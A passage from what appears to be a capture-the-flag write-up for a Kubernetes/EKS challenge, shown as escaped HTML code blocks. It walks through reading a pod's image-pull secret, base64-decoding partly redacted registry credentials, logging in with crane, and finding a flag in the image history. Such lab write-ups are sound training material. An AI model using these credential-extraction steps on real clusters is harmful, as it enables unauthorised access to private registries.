data-theme=\"default\"\u003e\u003ccode data-language=\"bash\" data-theme=\"default\" style=\"display: grid;\"\u003e\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #F69D50\"\u003e❯\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003ecrane\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003econfig\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003eeksclustergames/base_ext_image\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #F69D50\"\u003eError:\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003efetching\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003econfig:\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003ereading\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003eimage\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e\"eksclustergames/base_ext_image\":\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003eGET\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003ehttps://index.docker.io/v2/eksclustergames/base_ext_image/manifests/latest:\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003eUNAUTHORIZED:\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003eauthentication\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003erequired\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e; [map[Action:pull Class: Name:eksclustergames/base_ext_image Type:repository]]\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eWhich means this is a private image and we are going to need to get some\ncredentials to an account that has access to this image. Usually you have to\ndefine a secret for kubernetes to be able to pull from private registries and\nsince we started off with a secret test first that is where I'm going to go\nnext:\u003c/p\u003e\n\u003cdiv data-rehype-pretty-code-fragment=\"\"\u003e\u003cpre class=\"github-dark-dimmed\" style=\"background-color: #22272e\" tabindex=\"0\" data-language=\"bash\" data-theme=\"default\"\u003e\u003ccode data-language=\"bash\" data-theme=\"default\" style=\"display: grid;\"\u003e\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #F69D50\"\u003e❯\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003ekubectl\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003eget\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003epod\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e-o\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003ejson\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #F47067\"\u003e|\u003c/span\u003e\u003cspan style=\"color: #F69D50\"\u003ejq\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e'.items[0].spec.imagePullSecrets'\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e[\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e  {\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e    \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e\"name\"\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e: \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e\"registry-pull-secrets-780bab1d\"\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e  }\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e]\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eSo that is the secret we need, lets view it:\u003c/p\u003e\n\u003cdiv data-rehype-pretty-code-fragment=\"\"\u003e\u003cpre class=\"github-dark-dimmed\" style=\"background-color: #22272e\" tabindex=\"0\" data-language=\"bash\" data-theme=\"default\"\u003e\u003ccode data-language=\"bash\" data-theme=\"default\" style=\"display: grid;\"\u003e\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #F69D50\"\u003e❯\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003ekubectl\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003eget\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003esecret\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003eregistry-pull-secrets-780bab1d\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e-o\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003ejson\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #F47067\"\u003e|\u003c/span\u003e\u003cspan style=\"color: #F69D50\"\u003ejq\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e'.data.\".dockerconfigjson\"'\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e-r\u003c/span\u003e\u003cspan style=\"color: #F47067\"\u003e|\u003c/span\u003e\u003cspan style=\"color: #F69D50\"\u003ebase64\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e-d\u003c/span\u003e\u003cspan style=\"color: #F47067\"\u003e|\u003c/span\u003e\u003cspan style=\"color: #F69D50\"\u003ejq\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e{\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e  \u003c/span\u003e\u003cspan style=\"color: #F69D50\"\u003e\"auths\"\u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e:\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e{\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e    \u003c/span\u003e\u003cspan style=\"color: #F69D50\"\u003e\"index.docker.io/v1/\"\u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e:\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e{\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e      \u003c/span\u003e\u003cspan style=\"color: #F69D50\"\u003e\"auth\"\u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e:\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e\"ZWtzY2x1c3RlcmdhbWVzOmRj\u0026#x3C;*REDACTED*\u003e200bHI0NWlZUWo4RnVDbw==\"\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e    }\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e  }\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eLooks like we've got some more base64 decoding for the actual auth credentials:\u003c/p\u003e\n\u003cdiv data-rehype-pretty-code-fragment=\"\"\u003e\u003cpre class=\"github-dark-dimmed\" style=\"background-color: #22272e\" tabindex=\"0\" data-language=\"bash\" data-theme=\"default\"\u003e\u003ccode data-language=\"bash\" data-theme=\"default\" style=\"display: grid;\"\u003e\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #F69D50\"\u003e❯\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003eecho\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e\"ZWtzY2x1c3RdhbWVzOmRj\u0026#x3C;*REDACTED*\u003e200bHI0NWlZ4RnVDbw==\"\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #F47067\"\u003e|\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #F69D50\"\u003ebase64\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e-d\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #F69D50\"\u003eeksclustergames:dckr\u0026#x3C;*REDACTED*\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eSo now we can login with \u003ccode\u003ecrane auth\u003c/code\u003e:\u003c/p\u003e\n\u003cdiv data-rehype-pretty-code-fragment=\"\"\u003e\u003cpre class=\"github-dark-dimmed\" style=\"background-color: #22272e\" tabindex=\"0\" data-language=\"bash\" data-theme=\"default\"\u003e\u003ccode data-language=\"bash\" data-theme=\"default\" style=\"display: grid;\"\u003e\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #F69D50\"\u003e❯\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003ecrane\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003eauth\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003elogin\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e-u\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003eeksclustergames\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e-p\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003edckr\u003c/span\u003e\u003cspan style=\"color: #F47067\"\u003e\u0026#x3C;\u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e*\u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003eREDACTED\u003c/span\u003e\u003cspan style=\"color: #F47067\"\u003e*\u003e\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003edocker.io\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #F69D50\"\u003e2023/11/03\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e02\u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e:35:49\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003elogged\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003ein\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003evia\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e/home/user/.docker/config.json\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eSo if we try to view the image again it should work!\u003c/p\u003e\n\u003cdiv data-rehype-pretty-code-fragment=\"\"\u003e\u003cpre class=\"github-dark-dimmed\" style=\"background-color: #22272e\" tabindex=\"0\" data-language=\"bash\" data-theme=\"default\"\u003e\u003ccode data-language=\"bash\" data-theme=\"default\" style=\"display: grid;\"\u003e\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #F69D50\"\u003e❯\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003ecrane\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003econfig\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003eeksclustergames/base_ext_image\u003c/span\u003e\u003cspan style=\"color: #F47067\"\u003e|\u003c/span\u003e\u003cspan style=\"color: #F69D50\"\u003ejq\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e{\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e  \u003c/span\u003e\u003cspan style=\"color: #F69D50\"\u003e\"architecture\"\u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e:\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e\"amd64\",\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e  \u003c/span\u003e\u003cspan style=\"color: #F69D50\"\u003e\"config\"\u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e:\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e{\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e    \u003c/span\u003e\u003cspan style=\"color: #F69D50\"\u003e\"Env\"\u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e:\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e [\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e      \u003c/span\u003e\u003cspan style=\"color: #F69D50\"\u003e\"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\"\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e    ],\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e    \u003c/span\u003e\u003cspan style=\"color: #F69D50\"\u003e\"Cmd\"\u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e:\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e [\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e      \u003c/span\u003e\u003cspan style=\"color: #F69D50\"\u003e\"/bin/sleep\"\u003c/span\u003e\u003cspan style=\"color: #F69D50\"\u003e,\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e      \u003c/span\u003e\u003cspan style=\"color: #F69D50\"\u003e\"3133337\"\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e    ],\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e    \u003c/span\u003e\u003cspan style=\"color: #F69D50\"\u003e\"ArgsEscaped\"\u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e:\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003etrue\u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e,\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e    \u003c/span\u003e\u003cspan style=\"color: #F69D50\"\u003e\"OnBuild\"\u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e:\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003enull\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e  },\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e  \u003c/span\u003e\u003cspan style=\"color: #F69D50\"\u003e\"created\"\u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e:\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e\"2023-11-01T13:32:18.920734382Z\",\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e  \u003c/span\u003e\u003cspan style=\"color: #F69D50\"\u003e\"history\"\u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e:\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e [\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e    {\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e      \u003c/span\u003e\u003cspan style=\"color: #F69D50\"\u003e\"created\"\u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e:\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e\"2023-07-18T23:19:33.538571854Z\",\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e      \u003c/span\u003e\u003cspan style=\"color: #F69D50\"\u003e\"created_by\"\u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e:\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e\"/bin/sh -c #(nop) ADD file:7e9002edaafd4e4579b65c8f0aaabde1aeb7fd3f8d95579f7fd3443cef785fd1 in / \"\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e    },\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e    {\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e      \u003c/span\u003e\u003cspan style=\"color: #F69D50\"\u003e\"created\"\u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e:\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e\"2023-07-18T23:19:33.655005962Z\",\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e      \u003c/span\u003e\u003cspan style=\"color: #F69D50\"\u003e\"created_by\"\u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e:\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e\"/bin/sh -c #(nop)  CMD [\u003c/span\u003e\u003cspan style=\"color: #F47067\"\u003e\\\"\u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003esh\u003c/span\u003e\u003cspan style=\"color: #F47067\"\u003e\\\"\u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e]\",\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e      \u003c/span\u003e\u003cspan style=\"color: #F69D50\"\u003e\"empty_layer\"\u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e:\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003etrue\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e    },\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e    {\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e      \u003c/span\u003e\u003cspan style=\"color: #F69D50\"\u003e\"created\"\u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e:\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e\"2023-11-01T13:32:18.920734382Z\",\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e      \u003c/span\u003e\u003cspan style=\"color: #F69D50\"\u003e\"created_by\"\u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e:\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e\"RUN sh -c echo 'wiz_eks_challenge{nothing_can_be_said_to_*REDACTED*}' \u003e /flag.txt # buildkit\",\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e      \u003c/span\u003e\u003cspan style=\"color: #F69D50\"\u003e\"comment\"\u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e:\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e\"buildkit.dockerfile.v0\"\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e    },\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e    {\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e      \u003c/span\u003e\u003cspan style=\"color: #F69D50\"\u003e\"created\"\u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e:\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e\"2023-11-01T13:32:18.920734382Z\",\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e      \u003c/span\u003e\u003cspan style=\"color: #F69D50\"\u003e\"created_by\"\u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e:\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e\"CMD [\u003c/span\u003e\u003cspan style=\"color: #F47067\"\u003e\\\"\u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e/bin/sleep\u003c/span\u003e\u003cspan style=\"color: #F47067\"\u003e\\\"\u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e \u003c/span\u003e\u003cspan style=\"color: #F47067\"\u003e\\\"\u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e3133337\u003c/span\u003e\u003cspan style=\"color: #F47067\"\u003e\\\"\u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e]\",\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e      \u003c/span\u003e\u003cspan style=\"color: #F69D50\"\u003e\"comment\"\u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e:\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e\"buildkit.dockerfile.v0\",\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e      \u003c/span\u003e\u003cspan style=\"color: #F69D50\"\u003e\"empty_layer\"\u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e:\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003etrue\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e    }\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e  ],\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e  \u003c/span\u003e\u003cspan style=\"color: #F69D50\"\u003e\"os\"\u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e:\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e\"linux\",\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e  \u003c/span\u003e\u003cspan style=\"color: #F69D50\"\u003e\"rootfs\"\u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e:\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e{\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e    \u003c/span\u003e\u003cspan style=\"color: #F69D50\"\u003e\"type\"\u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e:\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e\"layers\",\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e    \u003c/span\u003e\u003cspan style=\"color: #F69D50\"\u003e\"diff_ids\"\u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e:\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e [\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e      \u003c/span\u003e\u003cspan style=\"color: #F69D50\"\u003e\"sha256:3d24ee258efc3bfe4066a1a9fb83febf6dc0b1548dfe896161533668281c9f4f\"\u003c/span\u003e\u003cspan style=\"color: #F69D50\"\u003e,\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e      \u003c/span\u003e\u003cspan style=\"color: #F69D50\"\u003e\"sha256:a70cef1cb742e242b33cc21f949af6dc7e59b6ea3ce595c61c179c3be0e5d432\"\u003c/span\u003e\u003c/span\u003e\n\u003cspan 